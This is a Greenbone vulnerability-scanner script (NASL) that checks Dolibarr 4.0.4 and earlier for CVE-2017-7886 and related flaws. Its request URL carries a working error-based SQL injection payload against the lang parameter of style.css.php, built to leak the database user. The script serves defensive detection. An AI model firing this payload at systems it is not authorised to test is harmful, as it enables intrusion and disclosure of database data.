# SPDX-FileCopyrightText: 2017 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:dolibarr:dolibarr";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.108160");
  script_version("2025-01-21T05:37:33+0000");
  script_tag(name:"last_modification", value:"2025-01-21 05:37:33 +0000 (Tue, 21 Jan 2025)");
  script_tag(name:"creation_date", value:"2017-05-15 10:42:44 +0200 (Mon, 15 May 2017)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2017-05-15 17:44:00 +0000 (Mon, 15 May 2017)");

  script_cve_id("CVE-2017-7886", "CVE-2017-7887", "CVE-2017-7888", "CVE-2017-8879");

  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Dolibarr <= 4.0.4 Multiple Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2017 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_dolibarr_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("dolibarr/http/detected");

  script_tag(name:"summary", value:"Dolibarr is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The following vulnerabilities exist:

  - SQL injection in /theme/eldy/style.css.php via the lang parameter.

  - XSS in /societe/list.php via the sall parameter.

  - Storing of passwords with the MD5 algorithm, which makes brute-force attacks easier.

  - Allowing password changes without supplying the current password, which makes it easier for
  physically proximate attackers to obtain access via an unattended workstation.");

  script_tag(name:"impact", value:"Successful exploitation will allow an attacker to execute
  arbitrary HTML and script code in a user's browser session in the context of a vulnerable site
  and to cause SQL injection attacks to gain sensitive information.");

  script_tag(name:"affected", value:"Dolibarr version 4.0.4 and probably prior.");

  script_tag(name:"solution", value:"Update to version 4.0.7, 5.0.3, 6.0.0 or later.");

  script_xref(name:"URL", value:"http://seclists.org/oss-sec/2017/q2/243");
  script_xref(name:"URL", value:"https://www.foxmole.com/advisories/foxmole-2017-02-23.txt");
  script_xref(name:"URL", value:"https://github.com/Dolibarr/dolibarr/issues/6504");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

url = dir + "/theme/eldy/style.css.php?lang=de%27%20procedure%20analyse(extractvalue(rand()%2cconcat(concat(0x3a,CURRENT_USER())))%2c1)--%201";

if( http_vuln_check( port:port, url:url, check_header:TRUE,
                     pattern:"Latest database access request error:</b> SELECT transkey, transvalue FROM (.*)overwrite_trans where lang=" ) ) {
  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
